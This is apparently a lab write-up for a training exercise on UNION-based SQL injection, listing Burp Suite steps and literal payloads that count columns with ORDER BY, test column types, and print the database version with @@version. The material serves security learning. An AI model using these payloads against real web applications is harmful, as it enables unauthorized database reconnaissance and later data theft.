# Lab 4 - SQL injection attack, querying the database type and version on MySQL and Microsoft

## Given
The lab contains an SQL injection vulnerability in the product category filter

## End Goal
Use UNION attack to retrieve results from an injected query and display the database version string

## Quick Steps
1. Intercept a category filter request in **Burp Suite** and send it to **Repeater**
2. **Determine Column Count:** Append `' ORDER BY 1-- `, incrementing the number until an error occurs (error at 3 -> 2 columns)
3. **Determine Data Types:** Inject `' UNION SELECT 'a','a'-- ` to test column types. A `200 OK` response confirms both columns accept strings
4. **Extract Version:** Use MySQL and Microsoft command to display the version string

## Payload and Mechanics
- **Column Count:** `' ORDER BY 1-- `, `' ORDER BY 2-- `, `' ORDER BY 3-- ` (Error)
- **Data Type Verification:** `' UNION SELECT 'a','a'-- `
- **Space:** Add space after double dash `--` to avoid error
- **Final Exploit Payload:** `' UNION SELECT @@version,NULL-- `

## Why it works
- **`UNION`**: Combines original query result with injected query
- **`@@version`**: Database specific command to display version info

## Result
The database type and version is displayed on the page. Lab solved
